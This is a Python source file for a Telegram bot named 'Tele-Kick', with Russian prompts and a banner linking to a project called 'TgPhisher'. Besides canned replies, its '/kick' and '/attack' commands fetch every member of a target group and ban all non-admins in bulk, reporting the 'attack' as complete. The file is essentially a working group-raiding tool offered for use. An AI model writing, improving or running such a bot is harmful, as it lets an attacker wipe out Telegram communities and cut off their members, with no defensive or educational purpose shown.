import logging
import asyncio
import json
import os
from telethon import TelegramClient, events
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.types import ChannelParticipantsSearch, ChannelParticipantAdmin, ChannelParticipantCreator
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChatBannedRights
from colorama import init, Fore, Style

# Инициализация colorama
init(autoreset=True)

# Определение цветов
red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN
yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT

# Константы
COMMANDS_FILE = 'commands.txt'
CONFIG_FILE = 'config.json'

# Логгирование
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''
{bold}{blue}
      ______      ____  __    _      __             
     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
        /____/                                   
{reset}           
                    .:Tele-Kick:.    
           {bold}{yellow}Telegram{reset}:{cyan} t.me/CYB3R_ST4LK3R
     {bold}{yellow}GitHub{reset}:{cyan} github.com/TheCyberStalker/TgPhisher

      ''')

def load_config():
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def load_commands():
    commands = {}
    try:
        with open(COMMANDS_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        command = None
        response = []
        for line in lines:
            line = line.strip()
            if line.startswith('/'):
                if command:
                    commands[command] = '\n'.join(response)
                command = line
                response = []
            else:
                response.append(line)
        if command:
            commands[command] = '\n'.join(response)
    except FileNotFoundError:
        logger.warning(f"Файл {COMMANDS_FILE} не найден.")
    return commands

async def main():
    print_banner()
     
    token = input(f"{blue}Введите токен вашего бота >> {reset}")
    ADMIN_IDS = input(f'{blue}Введите ваш телеграм айди:{reset}')#{7097104979} 

    config = load_config()

 #1331
    if 'API_ID' not in config or 'API_HASH' not in config:
        config['API_ID'] = input("Введите ваш API ID: ")
        config['API_HASH'] = input("Введите ваш API Hash: ")
        save_config(config)

    API_ID = config['API_ID']
    API_HASH = config['API_HASH']
    client = TelegramClient('bot', API_ID, API_HASH)

    await client.start(bot_token=token)
    print(f"{green}Бот запущен!{reset}")

    commands = load_commands()

    async def get_all_participants(chat):
        participants = []
        offset = 0
        limit = 100
        while True:
            participants_chunk = await client(GetParticipantsRequest(
                chat, ChannelParticipantsSearch(''), offset, limit, hash=0
            ))
            if not participants_chunk.participants:
                break
            participants.extend(participants_chunk.participants)
            offset += len(participants_chunk.participants)
        return participants

    async def kick_members(chat_id):
        chat = await client.get_entity(chat_id)
        participants = await get_all_participants(chat)
        removed_count = 0
        admin_ids = [admin.user_id for admin in participants if isinstance(admin, (ChannelParticipantAdmin, ChannelParticipantCreator))]
        print(f"{green}Начинается удаление участников из чата {chat.title}. Всего участников: {len(participants)}{reset}")
        
        for participant in participants:
            participant_id = participant.user_id if hasattr(participant, 'user_id') else participant.id
            if participant_id in ADMIN_IDS or participant_id in admin_ids:
                print(f"{yellow}Пропуск участника с ID {participant_id}{reset}")
                continue
            print(f"{red}Удаление участника с ID {participant_id}{reset}")
            try:
                await client(EditBannedRequest(chat_id, participant_id, ChatBannedRights(
                    until_date=None,
                    view_messages=True
                )))
                removed_count += 1
                if removed_count % 20 == 0:
                    print(f"{green}{removed_count} пользователей удалено из чата {chat.title}{reset}")
                    await asyncio.sleep(1) 
            except Exception as e:
                print(f"{red}Не удалось удалить пользователя {participant_id} из чата {chat.title}: {e}{reset}")
        print(f"{green}Атака на чат {chat.title} завершена. Удалено пользователей: {removed_count}{reset}")

    @client.on(events.NewMessage)
    async def handle_message(event):
        message_text = event.message.text.strip()
        if message_text in commands:
            await event.respond(commands[message_text])
        elif message_text.startswith('/kick'):
            if event.sender_id in ADMIN_IDS:
                await event.respond("Хорошо")
                await kick_members(event.chat_id)
                await event.respond("Проверяйте")
            else:
                await event.respond("У вас нет прав для использования этой команды.")
        elif message_text.startswith('/attack'):
            if event.sender_id in ADMIN_IDS:
                args = message_text.split()
                if len(args) > 1:
                    try:
                        chat_id = int(args[1])
                        await kick_members(chat_id)
                        await event.respond(f"запрос на атаку ID {chat_id} принят.")
                    except ValueError:
                        await event.respond("Пожалуйста, укажите правильный ID чата.")
                else:
                    await event.respond("Пожалуйста, укажите ID чата для атаки.")
            else:
                await event.respond("У вас нет прав для использования этой команды.\nИщите TgPhisher в GitHub!")

    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
